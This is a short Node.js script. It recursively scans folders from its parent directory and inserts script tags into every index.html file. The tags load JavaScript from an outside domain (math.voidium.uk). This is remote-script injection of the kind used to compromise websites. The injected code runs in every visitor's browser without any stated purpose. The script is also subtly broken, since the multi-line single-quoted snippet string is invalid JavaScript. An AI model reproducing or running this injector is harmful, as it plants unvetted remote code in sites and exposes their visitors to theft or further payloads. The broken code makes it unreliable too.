const fs = require('fs');
const path = require('path');

// ✅ Folder to scan — adjust this path as needed
const TARGET_FOLDER = path.resolve(__dirname, '../'); // example: 'public' folder

// ✅ The snippet to insert if missing
const SNIPPET = '<script src="https://math.voidium.uk/lib/fps.js"></script><head>
  <link rel="preload" href="https://math.voidium.uk/lib/effect.js" as="script">
  <script src="https://math.voidium.uk/lib/effect.js" defer></script>
</head>
';

/**
 * Recursively process all folders and only target index.html files.
 * @param {string} folder 
 */
function processFolder(folder) {
  const entries = fs.readdirSync(folder, { withFileTypes: true });

  for (const entry of entries) {
    const entryPath = path.join(folder, entry.name);

    if (entry.isDirectory()) {
      processFolder(entryPath);
    } else if (entry.isFile() && entry.name.toLowerCase() === 'index.html') {
      ensureSnippetInHtml(entryPath);
    }
  }
}

/**
 * Ensure the HTML file contains the SNIPPET; if not, insert it.
 * @param {string} filePath 
 */
function ensureSnippetInHtml(filePath) {
  try {
    let content = fs.readFileSync(filePath, 'utf8');

    // Use regex to detect snippet more flexibly (ignoring spaces)
    const snippetRegex = new RegExp(SNIPPET.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'i');

    if (!snippetRegex.test(content)) {
      const bodyCloseRegex = /<\/body\s*>/i;

      if (bodyCloseRegex.test(content)) {
        content = content.replace(bodyCloseRegex, `${SNIPPET}\n</body>`);
      } else {
        content += `\n${SNIPPET}`;
      }

      fs.writeFileSync(filePath, content, 'utf8');
      console.log(`✅ Added snippet to: ${filePath}`);
    } else {
      console.log(`ℹ️ Snippet already present in: ${filePath}`);
    }
  } catch (err) {
    console.error(`❌ Failed to process ${filePath}:`, err.message);
  }
}

// Start the process
processFolder(TARGET_FOLDER);
console.log('✅ All index.html files scanned and updated if needed!');
